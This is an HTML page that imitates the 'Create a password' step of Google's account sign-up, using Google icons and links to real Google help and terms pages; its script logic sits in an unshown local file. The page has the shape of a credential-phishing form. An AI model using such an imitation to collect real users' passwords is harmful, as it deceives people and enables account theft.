<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" lang="en">
  <title>Enter password</title>
  <link rel="icon" href="images/Google_icon-icons.com_56578.ico">
  <link rel="stylesheet" href="css/style.css">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script src="javascript/functions.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

  <div id="megadiv">
    <div id="main">
      <div id="instructions">
        <div id="left">
          <div id="get_instructed">
            <img src="images/google_icon-icons.com_62736.svg" onclick="piskot()" alt="Google" width="48" height="48">
            <h1>Create a password</h1>
            <p>The last step in creating your account</p>
          </div>
        </div>
        <div id="right">
          <div id="name_form_div">
            <form method="get" id="password_form">
              <input type="password" name="first_name" id="password" placeholder="password" minlength="7" required>
              <input type="password" name="last_name" id="confirm_password" placeholder="confirm password" minlength="7" required>
            </form>
          </div>
          <div id="bottom_right">
            <button id="next_button" onclick="checkPasswordForm()">Next</button>
          </div>
        </div>

      </div>
      <div id="undermenu">
        <div id="language">
          <select id="lang_button" name="language">
            <option value="English (United States)">English (United States)</option>
            <option value="English (United Kingdom)">English (United Kingdom)</option>
          </select>
        </div>

        <div id="under_container">
          <a href="https://support.google.com/accounts?hl=en&p=account_iph" target="_blank">Help</a>
          <a href="https://accounts.google.com/TOS?loc=SI&hl=en&privacy=true" target="_blank">Privacy</a>
          <a href="https://accounts.google.com/TOS?loc=SI&hl=en" target="_blank">Terms</a>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
